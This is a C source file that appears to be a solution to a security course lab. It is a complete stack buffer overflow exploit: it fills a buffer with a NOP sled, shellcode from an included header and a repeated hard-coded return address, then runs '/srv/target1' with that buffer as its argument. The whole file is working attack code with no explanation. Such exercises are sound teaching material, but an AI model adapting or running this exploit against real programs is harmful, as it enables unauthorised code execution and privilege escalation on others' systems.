#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

const int BUFFER_SIZE = 409;
const int SHELLCODE_OFFSET = 201;
const uint32_t RETURN_ADDRESS = 0xffffdb5c;

char* createExploitBuffer() {
    char *buffer = (char *)malloc(BUFFER_SIZE);
    memset(buffer, 0x90, BUFFER_SIZE - 1);
    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);

    uint32_t *ptr = (uint32_t *)(buffer + SHELLCODE_OFFSET + sizeof(shellcode) - 1);
    while ((char *)ptr < buffer + BUFFER_SIZE - 1) {
        *ptr++ = RETURN_ADDRESS;
    }

    buffer[BUFFER_SIZE - 1] = '\0';
    return buffer;
}

int main(void)
{
    char *args[3];
    char *env[1];
    char *exploitBuffer = createExploitBuffer();

    args[0] = TARGET;
    args[1] = exploitBuffer;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    free(exploitBuffer);
    return 0;
}